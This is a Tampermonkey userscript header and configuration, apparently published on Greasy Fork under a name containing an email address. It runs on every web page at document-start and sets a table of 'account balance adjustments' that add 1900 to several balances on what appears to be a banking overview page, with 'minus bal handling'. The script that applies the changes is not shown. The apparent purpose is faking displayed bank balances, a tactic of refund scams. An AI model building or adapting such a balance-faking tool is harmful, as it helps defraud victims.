// ==UserScript==
// @name         Ed Start 4Rec db.romana.ira@gmail.com
// @namespace    http://tampermonkey.net/
// @version      4.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/533107/Ed%20Start%204Rec%20dbromanaira%40gmailcom.user.js
// @updateURL https://update.greasyfork.org/scripts/533107/Ed%20Start%204Rec%20dbromanaira%40gmailcom.meta.js
// ==/UserScript==

//======================================================================================================================================================================================
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//======================================================================================================================================================================================


//         UBERSICHT
    // Specify the balances to adjust by index and the amount to adjust
    const accountBalanceAdjustments = [

        { index: 0, amount: 0 },
        { index: 1, amount: 0 },

         { index: 2, amount: 1900},  //3   // will have to change to 1395
        { index: 3, amount: 0 },  // 4  //will have to change to app 5700
       { index: 4, amount: 1900 },  // 5
         { index: 5, amount: 1900 }, //1
         { index: 6, amount:  0},
        { index: 7, amount: 1900 }, //2
         { index: 8, amount:  0},
        { index: 9, amount: 0 },

    ];


  